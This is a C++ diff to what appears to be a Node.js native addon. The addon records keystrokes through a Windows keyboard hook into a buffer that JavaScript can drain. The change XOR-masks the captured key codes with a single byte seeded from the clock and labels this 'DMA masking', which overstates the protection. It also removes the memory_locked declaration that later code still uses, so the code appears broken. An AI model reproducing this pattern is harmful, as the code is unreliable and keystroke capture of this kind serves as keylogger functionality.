@@ -9,8 +9,7 @@
 constexpr size_t MAX_SECURE_SIZE = 8192;
 uint8_t secure_buffer[MAX_SECURE_SIZE];
 size_t secure_len = 0;
-bool memory_locked = false;
-std::atomic<bool> is_hook_active(false);
+uint8_t XOR_KEY = 0; // Dynamic DMA masking key
 std::atomic<bool> worker_running(false);
 std::atomic<uint64_t> last_interaction_time(0);
 HHOOK hKeyboardHook = NULL;
@@ -40,7 +39,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 actionId = 1; // Append
                 last_interaction_time.store(std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count());
                 if (secure_len < MAX_SECURE_SIZE) {
-                    secure_buffer[secure_len++] = (uint8_t)vkCode;
+                    secure_buffer[secure_len++] = (uint8_t)vkCode ^ XOR_KEY;
                 }
             }
             
@@ -163,7 +162,16 @@ Napi::Value Wipe(const Napi::CallbackInfo& info) {
 Napi::Value DrainPayload(const Napi::CallbackInfo& info) {
     Napi::Env env = info.Env();
     AutoWiper wiper;
-    Napi::Buffer<uint8_t> buf = Napi::Buffer<uint8_t>::Copy(env, secure_buffer, secure_len);
+    
+    // Decrypt the payload before passing it to V8
+    uint8_t temp_buffer[MAX_SECURE_SIZE];
+    for (size_t i = 0; i < secure_len; i++) {
+        temp_buffer[i] = secure_buffer[i] ^ XOR_KEY;
+    }
+    
+    Napi::Buffer<uint8_t> buf = Napi::Buffer<uint8_t>::Copy(env, temp_buffer, secure_len);
+    SecureZeroMemory(temp_buffer, MAX_SECURE_SIZE); // Wipe temp buffer immediately
+    
     return buf;
 }
 
@@ -221,6 +229,11 @@ Napi::Object Init(Napi::Env env, Napi::Object exports) {
     if (!memory_locked) {
         VirtualLock(secure_buffer, MAX_SECURE_SIZE);
         memory_locked = true;
+        
+        // Generate random XOR mask for this session (simulated with generic seed as wincrypt is heavy)
+        srand((unsigned int)time(NULL));
+        XOR_KEY = (uint8_t)(rand() % 255);
+        if (XOR_KEY == 0) XOR_KEY = 0xAA; // Avoid 0-mask
     }
 #endif
     
